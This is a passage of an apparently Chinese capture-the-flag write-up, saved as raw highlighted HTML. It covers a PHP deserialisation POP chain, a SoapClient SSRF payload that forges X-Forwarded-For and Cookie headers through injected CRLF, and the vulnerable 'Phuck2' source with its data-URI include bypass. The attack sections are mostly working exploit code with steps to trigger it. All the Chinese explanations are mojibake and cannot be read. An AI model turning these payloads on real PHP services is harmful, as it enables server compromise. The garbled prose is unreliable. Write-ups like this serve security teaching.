&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">getflag&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// æ³¨æ„è¿™é‡Œçš„session
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">call_user_func&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">ee&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$str1&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// $dd
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$str2&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// &amp;#39;getflag&amp;#39;
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__toString&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">str1&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">str2&lt;/span>&lt;span style="color:#111">}();&lt;/span> &lt;span style="color:#75715e">// $dd-&amp;gt;getflag
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$bb&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">bb&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$aa&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">aa&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$cc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">cc&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$ee&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">ee&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$bb&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mod1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$aa&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$cc&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">mod1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$ee&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$dd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">dd&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$dd&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;Get_flag&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$dd&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;call_user_func&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$ee&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">str1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$dd&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$ee&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">str2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;getflag&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$aa&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mod2&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;test2&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$cc&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$bb&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>interface.php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Service.php&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$ser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">SoapServer&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Service.wsdl&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;soap_version&amp;#39;&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#75af00">SOAP_1_2&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">$ser&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">setClass&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Service&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$ser&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">handle&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ•´ä½“çš„æ€è·¯å¤§æ¦‚æ˜¯ï¼Œé€šè¿‡æ–‡ä»¶ä¸Šä¼ æŠŠä¸€ä¸ªæˆ‘ä»¬æž„é€ å¥½çš„æ¶æ„SoapClientçš„åºåˆ—åŒ–å­—ç¬¦ä¸²å†™å…¥sess_2333è¿™ä¸ªsessionæ–‡ä»¶ä¸­ï¼Œç„¶åŽåˆ©ç”¨se.phpçš„ååºåˆ—åŒ–åŠŸèƒ½ï¼Œè°ƒç”¨åˆ°&lt;code>call_user_func&lt;/code>çš„æ—¶å€™å°±ä¼šæŠŠsessionä¸­çš„SOAPç±»çš„Get_flagç»™è°ƒç”¨å‡ºæ¥ï¼Œ&lt;code>call_user_func('call_user_func', array($session, 'Get_flag'));&lt;/code>&lt;/p>
&lt;p>â€”â€”â€”â€”â€”â€”ä½†æ˜¯è¿™é‡Œå°±æœ‰ä¸ªé—®é¢˜ï¼Œæ€Žä¹ˆèƒ½ç¡®å®šæˆ‘ä»¬ssrfæ‰“çš„interface.phpå°±æœ‰Get_flagæ–¹æ³•å‘¢ï¼Ÿä¸ºä»€ä¹ˆä¸æ‰“ssrfçš„/index.php?method=get_flagå‘¢ï¼Ÿå‡ºé¢˜äººè¯´é‚£ä¸ªä¸è¾“å‡ºç»“æžœï¼Œå¤šåšäº†ä¸ªsoapæŽ¥å£interface.phpæ¥æ”»å‡»&lt;/p>
&lt;p>é¦–å…ˆæ˜¯è¿™ä¸ªSoapClient&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#111">$target&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://127.0.0.1/interface.php&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$headers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#39;X-Forwarded-For: 127.0.0.1&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;Cookie: user=xZmdm9NxaQ==&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">SoapClient&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;location&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#111">$target&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;user_agent&amp;#39;&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#d88200">&amp;#39;amiz^^Content-Type: application/x-www-form-urlencoded^^&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;^^&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$headers&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#d88200">&amp;#39;uri&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;amiz&amp;#34;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;^^&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">// O:10:&amp;#34;SoapClient&amp;#34;:5:{s:3:&amp;#34;uri&amp;#34;;s:4:&amp;#34;amiz&amp;#34;;s:8:&amp;#34;location&amp;#34;;s:30:&amp;#34;http://127.0.0.1/interface.php&amp;#34;;s:15:&amp;#34;_stream_context&amp;#34;;i:0;s:11:&amp;#34;_user_agent&amp;#34;;s:108:&amp;#34;amiz
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">Content-Type: application/x-www-form-urlencoded
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">X-Forwarded-For: 127.0.0.1
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">Cookie: user=xZmdm9NxaQ==&amp;#34;;s:13:&amp;#34;_soap_version&amp;#34;;i:1;}
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¼ ä¸ŠåŽ»ï¼Œè®°å¾—æ”¹PHPSESSID&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211115104728.png" alt="image-20211211115104728">&lt;/p>
&lt;p>ç„¶åŽåˆ°/se.phpï¼ŒPOSTæ–¹å¼ä¼ å…¥aa=popé“¾ç»“æžœ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211120852627.png" alt="image-20211211120852627">&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://ha1c9on.top/2020/05/19/swpu2019web6/">wp&lt;/a> | &lt;a href="https://www.cnblogs.com/20175211lyz/p/12285279.html">wp2&lt;/a>&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[Insomni hack teaser 2019]Phuck2
&lt;/h4>
&lt;/summary>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">stream_wrapper_unregister&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;php&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// ä¸å¤ªæ‡‚ï¼Ÿ
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;hl&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$mkdir&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$dir&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;mkdir -- &amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">escapeshellarg&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$dir&lt;/span>&lt;span style="color:#111">));&lt;/span> &lt;span style="color:#75715e">// å®šä¹‰å‡½æ•°$mkdir() è°ƒç”¨ç³»ç»Ÿå‡½æ•°mkdir
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#111">$randFolder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">bin2hex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">random_bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">));&lt;/span> &lt;span style="color:#75715e">// éšæœºå­—ç¬¦ä¸²
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$mkdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;users/&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$randFolder&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// å½“å‰ç›®å½•ä¸‹åˆ›å»ºå­ç›®å½•users/randFolder
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;users/&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$randFolder&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$userFolder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SERVER&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;HTTP_X_FORWARDED_FOR&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#111">$_SERVER&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;HTTP_X_FORWARDED_FOR&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">$_SERVER&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span> &lt;span style="color:#75715e">// å¯ä»¥è‡ªå®šä¹‰å­˜å‚¨è·¯å¾„
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$userFolder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">basename&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">([&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;-&amp;#39;&lt;/span>&lt;span style="color:#111">],[&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#111">$userFolder&lt;/span>&lt;span style="color:#111">));&lt;/span> &lt;span style="color:#75715e">// æ›¿æ¢`.`å’Œ`-`
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#111">$mkdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$userFolder&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// åˆ›å»ºå­ç›®å½•å¹¶è½¬åˆ°å­ç›®å½•ä¸­
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$userFolder&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;profile&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">print_r&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SERVER&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">));&lt;/span> &lt;span style="color:#75715e">// å†™å…¥å†…å®¹ æ–‡ä»¶åä¸ºprofile
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;..&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// å›žåˆ°users/randFolder
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;page&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;page&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span> &lt;span style="color:#75715e">// è¿‡æ»¤`.`
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">stripos&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;page&amp;#39;&lt;/span>&lt;span style="color:#111">]),&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;?&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">stripos&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;page&amp;#39;&lt;/span>&lt;span style="color:#111">]),&lt;/span>&lt;span style="color:#d88200">&amp;#39;php&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// æ–‡ä»¶å†…å®¹ä¸èƒ½æœ‰&amp;lt;?å’Œphp
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;page&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span> &lt;span style="color:#75715e">// æ–‡ä»¶åŒ…å«ç‚¹
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__DIR__&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// å›žåˆ°å½“å‰ç›®å½•
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;rm -rf users/&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$randFolder&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// åˆ é™¤users/randFolderåŠå…¶å­ç›®å½•
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è‡ªå·±ç¬¬ä¸€éçœ‹çš„æ—¶å€™æ²¡æ˜Žç™½ç¬¬ä¸€å¥å•¥æ„æ€ï¼ŒåŽŸæ¥ç¬¬ä¸€å¥çš„æ„æ€æ˜¯banäº†phpæµï¼Œç¡®å®žæŒºç‹ çš„ï¼›äº®ç‚¹æœ‰å‡ ä¸ªï¼Œé¦–å…ˆæ˜¯è°ƒç”¨ç³»ç»Ÿçº§çš„&lt;code>mkdir&lt;/code>å’Œ&lt;code>rm&lt;/code>å‘½ä»¤ï¼Œå°±éžå¸¸æœ‰å¯ä»¥ç»•è¿‡çš„ç©ºé—´ï¼ˆä½†æœ€åŽè€ƒçš„åœ°æ–¹ä¹Ÿä¸åœ¨è¿™ï¼‰ï¼Œå¦å¤–é‚£ä¸ª&lt;code>file_put_contents&lt;/code>æ–‡ä»¶çš„å†…å®¹æˆ‘ä»¬å¯æŽ§ï¼Œå› ä¸ºæ˜¯æ•´ä¸ª&lt;code>$_SERVER&lt;/code>æ•°ç»„ï¼ˆå¯ä»¥æŠŠæˆ‘ä»¬çš„ä»£ç å†™åˆ°ä»»æ„httpè¯·æ±‚å¤´ä¸­ï¼‰ï¼Œè¿˜æœ‰åŽé¢çš„&lt;code>include&lt;/code>æ–‡ä»¶åŒ…å«ç‚¹ä¸å…è®¸å†…å®¹æœ‰&lt;code>&amp;lt;?&lt;/code>å’Œ&lt;code>php&lt;/code>ï¼ˆéœ€è¦ç»•è¿‡è¿™ä¸ªæ£€æµ‹ï¼‰ï¼›æ®è¯´åŽé¢æœ‰phpinfo.phpçš„æç¤ºè¯´&lt;code>allow_url_fopen=On&lt;/code> &lt;code>allow_url_include=Off&lt;/code>&lt;/p>
&lt;p>è¿™é‡Œåˆ©ç”¨çš„ç‚¹æ˜¯&lt;code>include&lt;/code>ä¸Ž&lt;code>file_get_contents&lt;/code>åœ¨å¤„ç†Data URIä¸Šçš„é—®é¢˜ã€‚ä»–ä»¬éƒ½æ”¯æŒ&lt;code>data:text/vnd-example+xyz;foo=bar;base64,R0lGODdh&lt;/code>è¿™æ ·çš„å†…å®¹ï¼ˆè€Œä¸æ˜¯&lt;code>data://&lt;/code>æµï¼ï¼‰ï¼Œè¿˜æ¯”å¦‚&lt;code>data:image/jpeg;base64,xxx&lt;/code>è¿™æ ·çš„å›¾ç‰‡ç­‰ç­‰ï¼Œä½†æ˜¯æœ‰ä¸€äº›é—®é¢˜ï¼Œ&lt;code>file_get_contents&lt;/code>å…è®¸ä½¿ç”¨data URIï¼Œä¼šç›´æŽ¥è¿”å›žåŽé¢çš„å†…å®¹ï¼Œå½“&lt;code>allow_url_include=Off&lt;/code>æƒ…å†µä¸‹ä¸å…è®¸include data URIï¼Œä½†å¦‚æžœå½“&lt;code>data:,xxx&lt;/code>æ˜¯ä¸€ä¸ªç›®å½•åçš„è¯å°±ä¼šæ”¾å¼€è¿™ä¸ªé™åˆ¶ï¼ˆè¿”å›žxxx è€Œä¸æ˜¯æ–‡ä»¶å†…å®¹ï¼‰&lt;/p>
